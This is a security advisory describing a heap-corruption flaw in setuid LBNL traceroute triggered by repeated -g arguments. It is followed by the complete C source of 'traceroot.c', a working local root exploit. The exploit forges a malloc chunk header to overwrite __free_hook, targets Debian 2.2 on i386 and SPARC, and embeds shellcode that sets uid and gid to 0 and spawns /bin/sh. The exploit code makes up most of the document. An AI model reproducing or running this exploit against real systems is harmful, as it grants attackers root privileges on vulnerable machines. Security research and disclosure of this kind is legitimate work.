source: http://www.securityfocus.com/bid/1739/info
  
Traceroute is a well-known network diagnostic tool used for analyzing the path on a network between two hosts. On unix systems, traceroute is typically installed setuid root because of its use of raw sockets. Certain versions of LBNL traceroute are vulnerable to an interesting attack involving freeing of pointers pointing to unallocated memory.
  
When traceroute is executed with the arguments "-g x -g x", the function "savestr()" is called twice. savestr() does what strdup() does without the extra malloc() call and is used when parsing the hostname or "dotted quad notation" ip address argument to the -g parameter. It uses a block of pre-allocated memory instead of allocating memory itself. After the first instance of "-g" is parsed and savestr() is called, the pointer to the block used by savestr() is unallocated via free(). When the next gateway parameter (-g) is interpreted, savestr() is called again and the user data argument is written to the block of unallocated memory. Like in the first instance, free() is called on the pointer to where the data begins inside the old-buffer of unallocated memory. When free() doesn't find a valid malloc header before the pointer it is passed, traceroute crashes.
  
What makes this possibly exploitable is that the region of memory to which the pointer points is user-controlled and can be written to with (somewhat) arbitrary data before free() is called. An attacker may be able to construct a malicious malloc() header and carefully stuff it into the first savestr() buffer, so that is there when free() looks for it after the second savestr(). What complicates exploitation of this issue are the functions involved with savestr(), inet_addr() and gethostbyname(), which limit the type of user data that can be put into the buffer (which would need to be binary). If pulled off, however, it may be possible to overwrite aribitrary locations in the heap (such as a function pointer) with arbitrary data.
  
If successfully exploited this would yield local root access for the attacker. 

/*
 * MasterSecuritY <www.mastersecurity.fr>
 *
 * traceroot.c - Local root exploit in LBNL traceroute
 * Copyright (C) 2000  Michel "MaXX" Kaempf <maxx@mastersecurity.fr>
 *
 * Updated versions of this exploit and the corresponding advisory will
 * be made available at:
 *
 * ftp://maxx.via.ecp.fr/traceroot/
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define PREV_INUSE 0x1
#define IS_MMAPPED 0x2

#define i386_linux \
        /* setuid( 0 ); */ \
        "\x31\xdb\x89\xd8\xb0\x17\xcd\x80" \
        /* setgid( 0 ); */ \
        "\x31\xdb\x89\xd8\xb0\x2e\xcd\x80" \
        /* Aleph One :) */ \
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \
        "\x80\xe8\xdc\xff\xff\xff/bin/sh"
#define sparc_linux \
        /* setuid( 0 ); */ \
        "\x90\x1a\x40\x09\x82\x10\x20\x17\x91\xd0\x20\x10" \
        /* setgid( 0 ); */ \
        "\x90\x1a\x40\x09\x82\x10\x20\x2e\x91\xd0\x20\x10" \
        /* Aleph One :) */ \
        "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e" \
        "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0" \
        "\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x10"

struct arch {
        char *          description;
        char *          filename;
        unsigned int    stack;
        char *          hell;
        char *          code;
        unsigned int    p;
        unsigned int    __free_hook;
};

struct arch archlist[] = {
        {
                "Debian GNU/Linux 2.2 (traceroute 1.4a5-2) i386",
                "/usr/sbin/traceroute",
                0xc0000000 - 4,
                "\xeb\x0aXXYYYYZZZ",
                i386_linux,
                0x0804ce38,
                0x400f1cd8
        },
        {
                "Debian GNU/Linux 2.2 (traceroute 1.4a5-2) sparc",
                "/usr/sbin/traceroute",
                0xf0000000 - 8,
                "\x10\x80",
                "\x03\x01XXXYYYY" sparc_linux,
                0x00025598,
                0x70152c34
        }
};

void usage( char * string )
{

        int i;

        fprintf( stderr, "Usage: %s architecture\n", string );
        fprintf( stderr, "Available architectures:\n" );
        for ( i = 0; i < sizeof(archlist) / sizeof(struct arch); i++ ) {
                fprintf( stderr, "%i: %s\n", i, archlist[i].description );
        }
}

int main( int argc, char * argv[] )
{
        char            gateway[1337];
        char            host[1337];
        char            hell[1337];
        char            code[1337];
        char *          execve_argv[] = { NULL, "-g", "123", "-g", gateway, host, hell, code, NULL };
        int             i;
        struct arch *   arch;
        unsigned int    hellcode;
        unsigned int    size;

        if ( argc != 2 ) {
                usage( argv[0] );
                return( -1 );
        }
        i = atoi( argv[1] );
        if ( i < 0 || i >= sizeof(archlist) / sizeof(struct arch) ) {
                usage( argv[0] );
                return( -1 );
        }
        arch = &( archlist[i] );

        execve_argv[0] = arch->filename;

        strcpy( code, arch->code );
        strcpy( hell, arch->hell );
        hellcode = arch->stack - (strlen(arch->filename) + 1) - (strlen(code) + 1) - (strlen(hell) + 1);
        for ( i = 0; i < hellcode - (hellcode & ~3); i++ ) {
                strcat( code, "X" );
        }
        hellcode = hellcode & ~3;

        strcpy( host, "AAAABBBBCCCCDDDDEEEEXXX" );
        ((unsigned int *)host)[1] = 0xffffffff & ~PREV_INUSE;
        ((unsigned int *)host)[2] = 0xffffffff;
        ((unsigned int *)host)[3] = arch->__free_hook - 12;
        ((unsigned int *)host)[4] = hellcode;

        size = (hellcode - (strlen(host) + 1) + 4) - (arch->p - 4);
        size = size | PREV_INUSE;
        sprintf(
                gateway,
                "0x%02x.0x%02x.0x%02x.0x%02x",
                ((unsigned char *)(&size))[0],
                ((unsigned char *)(&size))[1],
                ((unsigned char *)(&size))[2],
                ((unsigned char *)(&size))[3]
        );

        execve( execve_argv[0], execve_argv, NULL );

        return( -1 );
}

